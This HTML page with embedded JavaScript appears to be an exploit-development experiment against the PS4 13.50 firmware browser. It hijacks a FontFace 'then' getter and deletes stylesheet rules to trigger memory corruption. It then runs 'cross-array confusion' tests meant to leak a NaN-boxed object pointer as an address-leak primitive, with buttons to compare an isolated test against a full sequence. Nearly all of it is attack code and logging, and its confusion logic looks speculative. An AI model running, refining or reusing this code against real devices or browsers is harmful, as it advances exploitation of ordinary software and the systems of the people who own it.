<!DOCTYPE html>
<html>
<head>
<title>PS4 13.50 - Isolation Test</title>
</head>
<body>
<h1 id="status">Test 4 Isolation Experiment</h1>
<button onclick="runTest4Only()" style="font-size: 20px; padding: 15px; margin: 10px; background: #ff0;">TEST 4 ONLY</button>
<button onclick="runTests1Through4()" style="font-size: 20px; padding: 15px; margin: 10px; background: #0ff;">TESTS 1-4</button>
<div id="log" style="font-family: monospace; font-size: 10px; white-space: pre-wrap; border: 2px solid #0f0; padding: 10px; max-height: 85vh; overflow-y: scroll; background: #000; color: #0f0;"></div>

<script>
"use strict";

let logBuf = [];
function log(msg) {
    logBuf.push(msg);
    let d = document.getElementById('log');
    if (d) {
        d.textContent = logBuf.join('\n');
        d.scrollTop = d.scrollHeight;
    }
}

function hex(n) {
    if (n < 0) n = n >>> 0;
    return '0x' + n.toString(16).padStart(8, '0');
}

class Int64 {
    constructor(low, high) {
        this.low = low >>> 0;
        this.high = high >>> 0;
    }
    
    static fromDouble(d) {
        let buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = d;
        let parts = new Uint32Array(buf);
        return new Int64(parts[0], parts[1]);
    }
    
    toString() {
        return '0x' + this.high.toString(16).padStart(8,'0') + '_' + this.low.toString(16).padStart(8,'0');
    }
}

// Shared state
let sharedArrays = null;

function setupArrays() {
    log('[*] Setting up arrays...');
    
    let floatArray = new Float64Array(100);
    let objectArray = new Array(100);
    
    for (let i = 0; i < 100; i++) {
        floatArray[i] = 1.1 * (i + 1);
        objectArray[i] = { id: i };
    }
    
    log('[*] Created Float64Array[100] and Array[100]');
    log('[*] Both pre-filled with patterns\n');
    
    return { floatArray, objectArray };
}

function triggerCorruption() {
    log('[*] Triggering corruption...');
    
    let style = document.createElement('style');
    style.id = 's' + Date.now();
    style.textContent = '@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }';
    document.head.appendChild(style);
    
    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
    document.fonts.add(A);
    void A.loaded;
    
    let fired = false;
    let corruptionPromise = new Promise((resolve) => {
        Object.defineProperty(FontFace.prototype, 'then', {
            configurable: true,
            get() {
                if (!fired && this === A) {
                    fired = true;
                    
                    log('[+] INSIDE GETTER\n');
                    
                    // Create corrupted fonts
                    let corrupted = [];
                    for (let i = 0; i < 50; i++) {
                        corrupted.push(new FontFace('c' + i, 'local(Helvetica)', {
                            unicodeRange: 'U+' + (0x100 + i).toString(16)
                        }));
                    }
                    
                    // Trigger corruption
                    document.querySelectorAll('style').forEach(s => {
                        if (s.sheet && s.sheet.cssRules.length > 0) {
                            try { s.sheet.deleteRule(0); } catch(e) {}
                        }
                    });
                    document.body.offsetTop;
                    
                    log('[*] Created ' + corrupted.length + ' corrupted fonts');
                    log('[*] Corruption triggered!\n');
                    
                    resolve(corrupted);
                }
                return undefined;
            }
        });
    });
    
    document.fonts.load('1em x', 'AB');
    
    return corruptionPromise;
}

// ============================================
// TEST 4 ONLY
// ============================================

function runTest4Only() {
    logBuf = [];
    log('╔════════════════════════════════════════════════╗');
    log('║           TEST 4 ONLY (ISOLATED)               ║');
    log('╚════════════════════════════════════════════════╝\n');
    
    log('[*] This runs ONLY Test 4');
    log('[*] No Tests 1-3 before it');
    log('[*] Testing if Test 4 works in isolation\n');
    
    // Setup arrays
    sharedArrays = setupArrays();
    
    // Trigger corruption
    triggerCorruption().then((corrupted) => {
        
        // Run ONLY Test 4
        log('╔════════════════════════════════════════╗');
        log('║       TEST 4: Cross-Array Confusion    ║');
        log('╚════════════════════════════════════════╝\n');
        
        try {
            let targetObject = { marker: 0xDEADBEEF, test: "target" };
            
            log('[*] Target object: ' + JSON.stringify(targetObject));
            log('[*] Current objectArray[50]: ' + JSON.stringify(sharedArrays.objectArray[50]));
            log('[*] Current floatArray[50]: ' + sharedArrays.floatArray[50] + '\n');
            
            // Store target object
            log('[*] Storing targetObject in objectArray[50]...');
            sharedArrays.objectArray[50] = targetObject;
            
            // Read from float array
            log('[*] Reading floatArray[50]...');
            let leaked = sharedArrays.floatArray[50];
            
            log('\n[RESULT]');
            log('  Leaked value: ' + leaked);
            log('  Type: ' + typeof leaked);
            
            if (typeof leaked === 'number') {
                let addr = Int64.fromDouble(leaked);
                log('  As Int64: ' + addr.toString());
                
                let expectedPattern = 56.1;
                let changed = Math.abs(leaked - expectedPattern) > 0.01;
                
                log('  Expected pattern: ' + expectedPattern);
                log('  Changed: ' + changed);
                
                if ((addr.high & 0xfff80000) === 0x7ff80000) {
                    log('\n  [+++] SUCCESS! NaN-BOXED POINTER!');
                    log('  [+++] TEST 4 WORKS IN ISOLATION!');
                } else if (changed) {
                    log('\n  [+] Value changed but not NaN-boxed');
                } else {
                    log('\n  [-] Still pattern - NO LEAK');
                }
            }
            
        } catch(e) {
            log('[ERROR] ' + e.message);
        }
        
        log('\n[!] OOM will occur\n');
    });
}

// ============================================
// TESTS 1-4 (FULL SEQUENCE)
// ============================================

function runTests1Through4() {
    logBuf = [];
    log('╔════════════════════════════════════════════════╗');
    log('║         TESTS 1-4 (FULL SEQUENCE)              ║');
    log('╚════════════════════════════════════════════════╝\n');
    
    log('[*] This runs Tests 1, 2, 3, then 4');
    log('[*] Testing if prior tests set up state for Test 4\n');
    
    // Setup arrays
    sharedArrays = setupArrays();
    
    // Trigger corruption
    triggerCorruption().then((corrupted) => {
        
        // ========== TEST 1 ==========
        log('╔════════════════════════════════════════╗');
        log('║  TEST 1: Corrupted Font Properties     ║');
        log('╚════════════════════════════════════════╝\n');
        
        try {
            let victim = corrupted[0];
            
            log('  status: ' + victim.status);
            log('  family: ' + victim.family);
            log('  style: ' + victim.style);
            
            for (let key in victim) {
                log('  ' + key + ': ' + victim[key]);
                if (key.length > 20) break;
            }
            
        } catch(e) {
            log('  ERROR: ' + e.message);
        }
        log('');
        
        // ========== TEST 2 ==========
        log('╔════════════════════════════════════════╗');
        log('║  TEST 2: Store in Corrupted Font       ║');
        log('╚════════════════════════════════════════╝\n');
        
        try {
            let victim = corrupted[1];
            let targetObject = { marker: 0xABCDEF, test: "target" };
            
            victim.leakTarget = targetObject;
            log('  Stored targetObject in victim.leakTarget');
            log('  victim.leakTarget: ' + victim.leakTarget);
            log('  typeof: ' + typeof victim.leakTarget);
            
        } catch(e) {
            log('  ERROR: ' + e.message);
        }
        log('');
        
        // ========== TEST 3 ==========
        log('╔════════════════════════════════════════╗');
        log('║  TEST 3: Mix Font with TypedArray      ║');
        log('╚════════════════════════════════════════╝\n');
        
        try {
            let victim = corrupted[2];
            
            sharedArrays.floatArray[50] = victim;
            log('  Stored corrupted font in floatArray[50]');
            
            let readback = sharedArrays.floatArray[50];
            log('  Read back: ' + readback);
            log('  Type: ' + typeof readback);
            
            if (typeof readback === 'number') {
                let addr = Int64.fromDouble(readback);
                log('  As Int64: ' + addr.toString());
            }
            
        } catch(e) {
            log('  ERROR: ' + e.message);
        }
        log('');
        
        // ========== TEST 4 ==========
        log('╔════════════════════════════════════════╗');
        log('║  TEST 4: Cross-Array Confusion         ║');
        log('╚════════════════════════════════════════╝\n');
        
        try {
            let targetObject = { marker: 0xDEADBEEF, test: "target" };
            
            log('[*] Target object: ' + JSON.stringify(targetObject));
            log('[*] Current objectArray[50]: ' + JSON.stringify(sharedArrays.objectArray[50]));
            log('[*] Current floatArray[50]: ' + sharedArrays.floatArray[50] + '\n');
            
            // Store target object
            log('[*] Storing targetObject in objectArray[50]...');
            sharedArrays.objectArray[50] = targetObject;
            
            // Read from float array
            log('[*] Reading floatArray[50]...');
            let leaked = sharedArrays.floatArray[50];
            
            log('\n[RESULT]');
            log('  Leaked value: ' + leaked);
            log('  Type: ' + typeof leaked);
            
            if (typeof leaked === 'number') {
                let addr = Int64.fromDouble(leaked);
                log('  As Int64: ' + addr.toString());
                
                let expectedPattern = 56.1;
                let changed = Math.abs(leaked - expectedPattern) > 0.01;
                
                log('  Expected pattern: ' + expectedPattern);
                log('  Changed: ' + changed);
                
                if ((addr.high & 0xfff80000) === 0x7ff80000) {
                    log('\n  [+++] SUCCESS! NaN-BOXED POINTER!');
                    log('  [+++] TEST 4 WORKS WITH TESTS 1-3!');
                } else if (changed) {
                    log('\n  [+] Value changed but not NaN-boxed');
                } else {
                    log('\n  [-] Still pattern - NO LEAK');
                }
            }
            
        } catch(e) {
            log('[ERROR] ' + e.message);
        }
        
        log('\n');
        
        // ========== SUMMARY ==========
        log('╔════════════════════════════════════════╗');
        log('║            SUMMARY                     ║');
        log('╚════════════════════════════════════════╝\n');
        
        log('[*] All 4 tests completed');
        log('[*] Check if Test 4 leaked NaN-boxed pointer');
        log('[*] Compare with "TEST 4 ONLY" result\n');
        
        log('[!] OOM will occur\n');
    });
}

log('╔════════════════════════════════════════════════╗');
log('║   PS4 13.50 - TEST 4 ISOLATION EXPERIMENT      ║');
log('╚════════════════════════════════════════════════╝\n');
log('[EXPERIMENT]');
log('  Does Test 4 work alone?');
log('  Or does it need Tests 1-3 before it?\n');
log('[BUTTONS]');
log('  YELLOW = Test 4 only (isolated)');
log('  CYAN   = Tests 1-4 (full sequence)\n');
log('[INSTRUCTIONS]');
log('  1. Click YELLOW button - note if Test 4 leaks');
log('  2. Refresh page');
log('  3. Click CYAN button - note if Test 4 leaks');
log('  4. Compare results!\n');

</script>
</body>
